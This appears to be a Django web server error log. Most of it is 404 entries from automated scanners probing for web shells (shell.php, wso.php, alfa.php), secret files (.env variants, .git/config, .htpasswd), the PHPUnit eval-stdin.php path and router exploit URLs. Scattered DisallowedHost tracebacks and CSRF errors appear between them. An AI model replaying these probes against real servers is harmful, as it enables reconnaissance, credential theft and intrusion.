Not Found: /autoload_classmap.php
Not Found: /wp-includes/images/
Not Found: /wp.php
Not Found: /about.php
Not Found: /files.php
Not Found: /.well-known/acme-challenge/index.php
Not Found: /cgi-bin/about.php
Not Found: /system.php
Not Found: /wp-includes/fonts/wp-login.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /.well-known/pki-validation/admin.php
Not Found: /.well-known/pki-validation/index.php
Not Found: /feed/atom/
Not Found: /manager.php
Not Found: /wordpress/about.php
Not Found: /wp-p.php7
Not Found: /index/function.php
Not Found: /tinyfilemanager.php
Not Found: /wp-content/themes/404.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-includes/sitemaps/
Not Found: /fucixwya.php
Not Found: /themes.php
Not Found: /.well-known/acme-challenge/admin.php
Not Found: //wp-includes/images/about.php
Not Found: /cgi-bin/cloud.php
Not Found: /upload/
Not Found: /aaa.php
Not Found: /ab1ux1ft.php
Not Found: /wp-activate.php
Not Found: /makeasmtp.php
Not Found: /wp-includes/ID3/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-content/updates.php
Not Found: /wp-consar.php
Not Found: /wp-includes/css/
Not Found: /wp-admin/css/
Not Found: /post.php
Not Found: /upfile.php
Not Found: /wp-includes/pomo/about.php
Not Found: /contact_tpl.php
Not Found: /cong.php
Not Found: /wp-includes/SimplePie/Cache/
Not Found: /disagraeosc.php
Not Found: /hoot.php
Not Found: /eNtnKM.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-includes/js/crop/
Not Found: /xleet.php
Not Found: /wp-admin/css/index.php
Not Found: /images/
Not Found: /class-walker-category-dropdown-class.php
Not Found: /wp-includes/PHPMailer/
Not Found: /wp-includes/pomo/
Not Found: /as.php
Not Found: /cljntmcz.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /.well-known/acme-challenge/
Not Found: /wp-includes/random_compat/
Not Found: /ggfi.php
Not Found: /Auth.php
Not Found: /5173e.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /css/cloud.php
Not Found: /cache-compat.php
Not Found: /gebase.php69
Not Found: /wp-admin/user/about.php
Not Found: /wp-content/wp-login.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-includes/SimplePie/Content/Type/
Not Found: /addslashes.php
Not Found: /global.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-includes/themes.php
Not Found: /wp-login.php
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/SimplePie/Content/
Not Found: /22.php
Not Found: /block-bindings.php
Not Found: /conf_upload.php
Not Found: /about/function.php
Not Found: /tinyfilemanager/tinyfilemanager.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/oceanwp/functions.php
Not Found: /depotcv.php
Not Found: /favicon.php
Not Found: /al.php
Not Found: /getid3-core.php
Not Found: /text.php
Not Found: /assets/
Not Found: /.well-known/wp-2019.php
Not Found: /wp-admin/network/index.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /e69ovfsr.php
Not Found: /wp-mail.php
Not Found: /wp-admin/cloud.php
Not Found: /atomlib.php
Not Found: /contentloader1.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /Alfa.php
Not Found: /install.php
Not Found: /manager.php
Not Found: /wp-admin/css/colors/coffee/index.php
Not Found: /wp-includes/Requests/Proxy/
Not Found: /flower.php
Not Found: /disagreed.php
Not Found: /.well-known/
Not Found: /wp-content/themes/classic/inc/
Not Found: /OK.php
Not Found: /wp-content/about.php
Not Found: /wp-includes/php-compat/
Not Found: /colour.php
Not Found: /bihnmimh.php
Not Found: /wp-includes/Requests/
Not Found: /wp-content/plugins/ninja-forms/
Not Found: /include/
Not Found: /alfa-rex.php7
Not Found: /wp-includes/Text/Diff/Renderer/
Not Found: /wp-includes/customize/
Not Found: /lufix.php
Not Found: /geju.php
Not Found: /yanz.php
Not Found: /doc.php
Not Found: /simple.php
Not Found: /wp-admin/images/cloud.php
Not Found: /class-php
Not Found: /cJLGqzB.php
Not Found: /dirs.php
Not Found: /readme.php
Not Found: /wp-content/themes/astra/inc/ki1k.php
Not Found: /wp-content/themes/wp-pridmag/init.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-content/plugins/admin.php
Not Found: /css.php
Not Found: /moon.php
Not Found: /12.php
Not Found: /cookie.php
Not Found: /file.php
Not Found: /makeasmtp.php
Not Found: /wp-includes/css/admin.php
Not Found: /wp-includes/certificates/
Not Found: /Site/
Not Found: /wp-includes/Text/Diff/
Not Found: /about.php7
Not Found: /plugins.php
Not Found: /Assets/
Not Found: /wp-content/
Not Found: /go.php
Not Found: /cadastro-2.php
Not Found: /essexec.php
Not Found: /wp-admin/index.php
Not Found: /css/xmrlpc.php
Not Found: /wp-includes/Requests/Auth/
Not Found: /wp-includes/js/
Not Found: /images/xmrlpc.php
Not Found: /fxcexgle.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /add_actualites.php
Not Found: /.well-known/about.php
Not Found: /wp-content/index.php
Not Found: /wp-includes/block-supports/
Not Found: /wp-includes/Requests/Response/
Not Found: /disagraeed.php
Not Found: /IDhrIlrLb.php
Not Found: /wp.php
Not Found: /ebs.php7
Not Found: /1index.php
Not Found: /cnzcsfwm.php
Not Found: /wp-includes/SimplePie/wp-login.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-includes/Requests/Exception/
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /cache-base.php
Not Found: /blog.php7
Not Found: /disagraep.php
Not Found: /.well-known/pki-validation/file.php
Not Found: /Admin/uploads/
Not Found: /.well-known/pki-validation/wp-login.php
Not Found: /wsoyanz.php
Not Found: /wp-includes/js/codemirror/
Not Found: /alfa.php
Not Found: /css/index.php
Not Found: /randkeyword.php
Not Found: /wp-atom.php
Not Found: /adminfuns.php7
Not Found: /GOD.php
Not Found: /disagrsod.php
Not Found: /wp-admin/user/index.php
Not Found: /wp-content/plugins/index.php
Not Found: /wp-includes/Requests/Transport/
Not Found: /wp-content/themes/
Not Found: /wp-comments-post.php
Not Found: /shell.php
Not Found: /wp-admin/themes.php
Not Found: /wp-content/plugins/fix/up.php
Not Found: /class-walker-comment-beta.php
Not Found: /amaxx.php
Not Found: /gecko.php
Not Found: /inputs.php
Not Found: /wp-admin/about.php
Not Found: /wp-content/themes/kadence/functions.php
Not Found: /vendor/
Not Found: /wp-includes/style-engine/
Not Found: /xmrlpc.php
Not Found: /abouts.php
Not Found: /wp-admin/network/
Not Found: /wp-admin/user/
Not Found: /license.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-includes/about.php
Not Found: /wp-content/repeater.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /uploads/
Not Found: /dropdown.php
Not Found: /wp-sigunq.php
Not Found: /NFXxUAA.php
Not Found: /shell20211028.php
Not Found: /wp-content/themes/index.php
Not Found: /files/
Not Found: /4price.php
Not Found: /.well-known/index.php
Not Found: /cgi-bin/index.php
Not Found: /index.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /DxHhVcy2bmJ.php
Not Found: /admin.php1
Not Found: /wp-2019.php
Not Found: /mah.php
Not Found: /wp-includes/SimplePie/gzdecodes.php.suspected
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /inc.php
Not Found: /.well-known/themes.php
Not Found: /ok.php
Not Found: /wp-configs.php
Not Found: /ajax-actions.php
Not Found: /wp-content/mu-plugins-old/
Not Found: /wp-includes/images/crystal/
Not Found: /wp-includes/sitemaps/providers/
Not Found: /wp-admin/css/colors/
Not Found: /ds.php
Not Found: /cgi-bin/
Not Found: /inputs.php
Not Found: /images/about.php
Not Found: /02.php
Not Found: /filemanager.php
Not Found: /wp-includes/theme-compat/about.php
Not Found: /template/
Not Found: /wp-includes/theme-compat/
Not Found: /sites/default/files/
Not Found: /index.php
Not Found: /Njima.php
Not Found: /wp-admin/css/colors/blue/admin.php
Not Found: /login.rsp
Not Found: /robots.txt
Not Found: /.env
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /portal/.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /boaform/admin/formLogin
Not Found: /login.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-conf.php
Not Found: /wp-admin/maint/index.php
Not Found: /.well-known/acme-challenge/index.php
Not Found: /wp-content/plugins/core-plugin/include.php
Not Found: /randkeyword.php
Not Found: /wp-content/index.php
Not Found: /404.php
Not Found: /wp-admin/network/index.php
Not Found: /.well-known/index.php
Not Found: /wp-login.php
Not Found: /plugin.php
Not Found: /install.php
Not Found: /function.php
Not Found: /wp-content/uploads/2023/05/404.php
Not Found: /ws.php
Not Found: /tiny.php
Not Found: /.well-known/about.php
Not Found: /autoload_classmap.php
Not Found: /dropdown.php
Not Found: /wp.php
Not Found: /css/index.php
Not Found: /x.php
Not Found: /file.php
Not Found: /about.php
Not Found: /.well-known/acme-challenge/plugins.php
Not Found: /menu.php
Not Found: /mah.php
Not Found: /bs1.php
Not Found: /wp-content/plugins/revslider/includes/external/page/index.php
Not Found: /moon.php
Not Found: /lv.php
Not Found: /defaults.php
Not Found: /config.php
Not Found: /radio.php
Not Found: /options.php
Not Found: /wp-content/plugins/pwnd/pwnd.php
Not Found: /wp-includes/install.php
Not Found: /wp-admin/js/index.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /edit.php
Not Found: /x/index.php
Not Found: /wp-atom.php
Not Found: /wp-mail.php
Not Found: /.well-known/acme-challenge/install.php
Not Found: /wp-content/themes/sketch/404.php
Not Found: /wp-admin/images/Mhbgf.php
Not Found: /wp-content/mah.php
Not Found: /templates/hcapmaster_comps.php
Not Found: /dir.php
Not Found: /wp-content/uploads/index.php
Not Found: /wp-settings.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /chosen.php
Not Found: /lock.php
Not Found: /classwithtostring.php
Not Found: /cong.php
Not Found: /themes.php
Not Found: /.well-known/acme-challenge/admin.php
Not Found: /admin.php
Not Found: /wp-admin/includes/about.php
Not Found: /wp-content/languages/index.php
Not Found: /wp-content/plugins/WordPressCore/include.php
Not Found: /about/function.php
Not Found: /.well-known/pki-validation/shell.php
Not Found: /.well-known/pki-validation/install.php
Not Found: /wp-content/plugins/index.php
Not Found: /test.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /atomlib.php
Not Found: /bypass.php
Not Found: /css/load.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /upload.php
Not Found: /simple.php
Not Found: /cgi-bin/cgi-bin/about.php
Not Found: /.well-known/pki-validation/index.php
Not Found: /1.php
Not Found: /wp-includes/mah.php
Not Found: /adminer.php
Not Found: /index/function.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /.well-known/acme-challenge/license.php
Not Found: /wp-info.php
Not Found: /wp-content/plugins/core/include.php
Not Found: /wp-admin/css/index.php
Not Found: /wp-trackback.php
Not Found: /cgi-bin/admin.php
Not Found: /wp-includes/css/index.php
Not Found: /contact.php
Not Found: /wp-content/install.php
Not Found: /ioxi002.php
Not Found: /xp.php
Not Found: /wp-content/plugins/fix/up.php
Not Found: /wp-admin/maint/about.php
Not Found: /wso.php
Not Found: /wp-content/themes/travelscape/json.php
Not Found: /wp-content/admin.php
Not Found: /content.php
Not Found: /wp-admin/install.php
Not Found: /wp-signup.php
Not Found: /wp-conflg.php
Not Found: /network.php
Not Found: /web.php
Not Found: /wp-content/plugins/fix/as.php
Not Found: /upload/upload.php
Not Found: /.well-known/acme-challenge/upfile.php
Not Found: /checkbex.php
Not Found: /wp-content/plugins/background-image-cropper/ups.php
Not Found: /wp-includes/SimplePie/index.php
Not Found: /.well-known/install.php
Not Found: /wp-content/about.php
Not Found: /wp-2019.php
Not Found: /default.php
Not Found: /wp-includes/class-wp-smtp-bar.php
Not Found: /sitemap
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /hudson
Not Found: /libs/js/iframe.js
Not Found: /.git/config
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /.env.dev
Not Found: /.env.production.local
Not Found: /.env.testing
Not Found: /src/.git/config
Not Found: /.env.production
Not Found: /.env.save
Not Found: /.env.dev.local
Not Found: /api/.env
Not Found: /.env.staging.local
Not Found: /.env
Not Found: /.env.live
Not Found: /data/.git/config
Not Found: /public/.git/config
Not Found: /.env.test
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /msp_info.htm
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /sitemap
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /actuator/gateway/routes
Not Found: /sitemap
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-content/uploads/
Not Found: /wp-includes/
Not Found: /wp-includes/css/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/Text/
Not Found: /wp-content/mu-plugins-old/
Not Found: /wp-content/themes/classic/inc/
Not Found: /wp-content/plugins/ninja-forms/
Not Found: /wp-content/mu-plugins/
Not Found: /wp-includes/Text/Diff/Renderer/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/images/
Not Found: /.well-known/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /cgi-bin/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /uploads/
Not Found: /upload/
Not Found: /Admin/uploads/
Not Found: /images/
Not Found: /assets/
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/
Not Found: /upload/image/
Not Found: /assets/images/
Not Found: /Public/
Not Found: /vendor/
Not Found: /config.json
Not Found: /local/
Not Found: /.env
Not Found: /modules/
Not Found: /telescope/requests
Not Found: /Site/
Not Found: /info.php
Not Found: /system/
Not Found: /template/
Not Found: /.git/config
Not Found: /shop/
Not Found: /server-status
Not Found: /files/
Not Found: /include/
Not Found: /Assets/
Not Found: /images/stories/
Not Found: /plugins/
Not Found: /php/
Not Found: /wp-includes/assets/
Not Found: /wp-includes/Text/Diff/Engine/
Not Found: /wp-includes/block-patterns/
Not Found: /wp-includes/Text/Diff/
Not Found: /wp-includes/block-supports/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/SimplePie/Cache/
Not Found: /wp-includes/SimplePie/Content/Type/
Not Found: /wp-includes/css/
Not Found: /wp-includes/SimplePie/Content/
Not Found: /wp-includes/rest-api/endpoints/
Not Found: /wp-includes/rest-api/fields/
Not Found: /wp-includes/Requests/Cookie/
Not Found: /wp-includes/Requests/Proxy/
Not Found: /wp-includes/Requests/Response/
Not Found: /wp-includes/Requests/Transport/
Not Found: /wp-includes/Requests/Utility/
Not Found: /wp-includes/js/codemirror/
Not Found: /wp-includes/Requests/Exception/HTTP/
Not Found: /wp-includes/js/crop/
Not Found: /wp-includes/images/crystal/
Not Found: /wp-includes/images/media/
Not Found: /wp-includes/images/smilies/
Not Found: /wp-includes/images/wlw/
Not Found: /wp-includes/rest-api/search/
Not Found: /wp-includes/Requests/Exception/
Not Found: /wp-includes/Requests/Auth/
Not Found: /wp-includes/sodium_compat/src/
Not Found: /wp-includes/sitemaps/providers/
Not Found: /wp-includes/Text/Diff/Engine/Engine/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/html-api/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/images/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/js/
Not Found: /wp-includes/php-compat/
Not Found: /wp-includes/PHPMailer/
Not Found: /wp-includes/pomo/
Not Found: /wp-includes/random_compat/
Not Found: /php.php
Not Found: /php2.php
Not Found: /phpinfo.php
Not Found: /info.php
Not Found: /infophp.php
Not Found: /php_info.php
Not Found: /test.php
Not Found: /i.php
Not Found: /a.php
Not Found: /p.php
Not Found: /pi.php
Not Found: /asdf.php
Not Found: /pinfo.php
Not Found: /phpversion.php
Not Found: /time.php
Not Found: /inf0.php
Not Found: /index.php
Not Found: /temp.php
Not Found: /old_phpinfo.php
Not Found: /infos.php
Not Found: /linusadmin-phpinfo.php
Not Found: /php-info.php
Not Found: /dashboard/phpinfo.php
Not Found: /_profiler/phpinfo.php
Not Found: /_profiler/phpinfo
Not Found: /l.php
Not Found: /.user.ini
Not Found: /phpMyAdmin/
Not Found: /phpmyadmin/
Not Found: /pma/
Not Found: /shell.php
Not Found: /backdoor.php
Not Found: /cmd.php
Not Found: /server-status
Not Found: /server-info
Not Found: /_debugbar/resources/phpinfo
Not Found: /_debugbar/phpinfo
Not Found: /.env.bak
Not Found: /.env.dev
Not Found: /.env.dev.local
Not Found: /.env.development.local
Not Found: /.env.prod
Not Found: /.env.prod.local
Not Found: /.env.production
Not Found: /.env.production.local
Not Found: /.env.example
Not Found: /.env.stage
Not Found: /.env.live
Not Found: /.env.backup
Not Found: /.env.save
Not Found: /.env.old
Not Found: /.env.www
Not Found: /.env_1
Not Found: /.env_sample
Not Found: /.env.{{DN}}
Not Found: /.env.{{SD}}
Not Found: /api/.env
Not Found: /.config
Not Found: /.htpasswd
Not Found: /config.php
Not Found: /database.php
Not Found: /credentials.json
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/index.html
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Bad Request: /contact/
Forbidden (CSRF token missing.): /contact/
Not Found: /contact.html
Not Found: /robots.txt
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /Blogs/contact.html
Not Found: /.env.production
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/index.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /robots.txt
Not Found: /Blogs/index.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/contact.html
Not Found: /contact/contact.html
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /contact/index.html
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/contact.html
Not Found: /.env.uat
Not Found: /build/.env
Not Found: /prod/.env
Not Found: /.env.template
Not Found: /app/.git/config
Not Found: /assets../.git/config
Not Found: /.env.live
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /src/.git/config
Not Found: /configuration/.env
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /robots.txt
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /contact.html
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
